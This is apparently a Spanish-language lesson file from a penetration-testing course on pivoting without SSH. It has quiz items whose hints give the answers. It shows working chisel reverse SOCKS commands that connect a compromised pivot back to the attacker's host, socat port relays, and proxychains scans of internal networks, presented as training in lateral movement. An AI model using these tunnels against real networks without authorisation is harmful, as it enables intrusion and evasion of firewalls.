@@ -1,0 +1,86 @@
+---
+index: 3
+title: "Sin SSH: chisel y socat"
+questions:
+  - id: pivoting-y-tunneling-t03-q01
+    prompt: "¿En qué lenguaje está escrito chisel (lo que le da su binario único multiplataforma que subes al pivote)?"
+    hint: "Go — mismo motivo por el que los C2 modernos también lo usan"
+    kind: text
+  - id: pivoting-y-tunneling-t03-q02
+    prompt: "Escribe el comando del SERVIDOR de chisel en el pivote 10.10.10.5 para abrir un SOCKS5 en su puerto 1080 hacia tu Kali (la conexión la inicia el pivote hacia tu 443)."
+    hint: "chisel server -p 8000 --reverse en TU Kali; en el pivote: chisel client https://TU_IP:8000 R:socks"
+    kind: text
+  - id: pivoting-y-tunneling-t03-q03
+    prompt: "Con socat: ¿qué opción de socat en el pivote reenvía un puerto local hacia otro host (relay TCP puro, sin cifrar) tipo 'port forward' mínimo?"
+    hint: "socat TCP-LISTEN:8080,fork TCP:192.168.1.20:80 — escucha 8080 y relaya al interno"
+    kind: text
+  - id: pivoting-y-tunneling-t03-q04
+    prompt: "¿Qué ventaja CLAVE tiene el modo reverse de chisel (--reverse) en redes con firewall de salida estricto?"
+    hint: "La conexión la INICIA el pivote hacia tu servidor (puerto 443 típico): no necesitas exponer puertos ni que el firewall permita entrantes hacia el pivote"
+    kind: text
+---
+
+## Cuando no hay SSH
+
+Muchos pivotes (una web shell, un Windows sin OpenSSH, un IoT) no te
+dan SSH. Las dos herramientas que llenan ese hueco:
+
+## chisel: el túnel HTTP/WebSocket
+
+Un solo binario (Go) que corre igual en tu Kali, en el Windows del
+pivote o en un ARM de una cámara IP. Subes el binario, ejecutas, y
+tienes SOCKS o port forwards por un canal que atraviesa proxies HTTP
+(WebSockets disfrazados de tráfico web).
+
+**Túnel reverso (el caso más común — red interna sin entrantes):**
+
+```bash
+# 1. En TU Kali (el servidor de chisel, escuchando en 443 que suele estar permitido):
+./chisel server -p 443 --reverse
+
+# 2. En el PIVOTE (sube el binario de chisel de su arquitectura):
+./chisel client https://TU_IP:443 R:socks
+
+# 3. Resultado: SOCKS5 en TU localhost:1080 saliendo por el pivote
+proxychains nmap -sT -Pn -n 192.168.1.0/24 --top-ports 100
+```
+
+Fíjate en la dirección: el pivote SE CONECTA a ti. Ningún puerto
+entrante nuevo en el segmento interno; el firewall ve una conexión
+HTTPS saliente normal. `--reverse` autoriza al cliente a registrar
+listeners en tu servidor.
+
+**Forward de puerto puntual** (el equivalente a `ssh -L`):
+
+```bash
+# Kali: ./chisel server -p 443 --reverse
+# Pivote: ./chisel client https://TU_IP:443 R:8080:192.168.1.20:8080
+# → TU localhost:8080 = 192.168.1.20:8080 vía pivote
+```
+
+## socat: el cable TCP universal
+
+Cuando solo necesitas un relay directo y el binario ya está en el
+objetivo (socat es habitual en Linux):
+
+```bash
+# En el pivote: 8080 del pivote → servicio interno
+socat TCP-LISTEN:8080,fork,reuseaddr TCP:192.168.1.20:8080 &
+
+# Ahora desde fuera apuntas al pivote:8080 (si la DMZ lo permite)
+curl http://10.10.10.5:8080
+```
+
+sin cifrar y sin autenticación — perfecto dentro de un segmento que
+controlas temporalmente, imperdonable en el primer salto. socat también
+sirve para file transfer (`socat TCP-LISTEN:9001 FILE:chisel_bin`),
+shells interactivas y decenas de relays más: es el comodín.
+
+## Elección rápida
+
+| Situación | Herramienta |
+|---|---|
+| Credenciales SSH en el pivote | `ssh -D` + proxychains |
+| Sin SSH, salida HTTPS del pivote | chisel reverse SOCKS |
+| Relay simple de un puerto, socat ya presente | socat |
+| Necesitas UDP/DNS por el túnel | sshuttle o VPN (WireGuard) |
